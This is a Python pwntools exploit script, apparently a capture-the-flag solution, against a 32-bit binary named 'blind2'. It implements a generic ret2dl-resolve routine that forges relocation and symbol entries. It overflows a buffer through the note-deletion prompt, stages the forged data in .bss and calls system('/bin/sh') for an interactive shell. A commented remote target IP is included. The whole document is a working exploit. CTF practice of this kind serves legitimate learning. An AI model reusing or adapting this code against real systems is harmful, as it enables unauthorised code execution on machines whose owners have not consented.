from pwn import *
from time import sleep

context.log_level = "debug"
p = process("./blind2")
# p = remote("118.24.3.214" , 12344)
elf = ELF("./blind2")

def add(index,note):
     p.sendlineafter(">","1")
     p.sendlineafter(":",str(index))
     p.sendlineafter(":",note)

def delete(index,s="n\n"):
     p.sendlineafter(">","2")
     p.sendlineafter("confirm?",s)
     p.sendlineafter(":",str(index))


def ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=1):
    jmprel = ELF_obj.dynamic_value_by_tag("DT_JMPREL")#rel_plt
    relent = ELF_obj.dynamic_value_by_tag("DT_RELENT")
    symtab = ELF_obj.dynamic_value_by_tag("DT_SYMTAB")#dynsym
    syment = ELF_obj.dynamic_value_by_tag("DT_SYMENT")
    strtab = ELF_obj.dynamic_value_by_tag("DT_STRTAB")#dynstr
    versym = ELF_obj.dynamic_value_by_tag("DT_VERSYM")#version
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr

    p_name = fake_stage+8-strtab
    len_bypass_version = 8-(len(func_name)+1)%0x8
    sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab

    if sym_addr_offset%0x10 != 0:
        if sym_addr_offset%0x10 == 8:
            len_bypass_version+=8
            sym_addr_offset = fake_stage+8+(len(func_name)+1)+len_bypass_version-symtab
        else:
            error('something error!')

    fake_sym = sym_addr_offset/0x10

    while True:
        fake_ndx = u16(ELF_obj.read(versym+fake_sym*2,2))
        if fake_ndx != 0:
            fake_sym+=1
            len_bypass_version+=0x10
            continue
        else:
            break

    if do_slim:
        slim = len_bypass_version - len_bypass_version%8
        version = len_bypass_version%8
        resolve_data,resolve_call=ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage+slim,0)
        return (resolve_data,resolve_call,fake_stage+slim)

    fake_r_info = fake_sym<<8|0x7
    reloc_offset=fake_stage-jmprel

    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+'\x00'
    resolve_data += 'a'*len_bypass_version
    resolve_data += p32(p_name)+p32(0)+p32(0)+p32(0x12)

    resolve_call = p32(plt0)+p32(reloc_offset)

    return (resolve_data,resolve_call)

add(0 , "fantasy")
# dl_data
stage = elf.bss() + 0x400
dl_data,dl_call,stage = ret2dl_resolve_x86(elf,'system',stage+0x200,stage)
# gdb.attach(p , "b *0x08048460\nc")
payload = "a" * 0xd + "b" * 4
payload += p32(elf.plt["read"]) + p32(elf.sym["main"]) + p32(0) + p32(stage) + p32(len(dl_data) + 8) 
delete(11 , payload)

p.sendafter("invalid range\n" , dl_data + "/bin/sh\x00")
payload = "a" * 0xd + "b" * 4
payload += dl_call + p32(stage) + p32(stage + len(dl_data))
delete(11 , payload)
# sleep(1)
p.interactive()
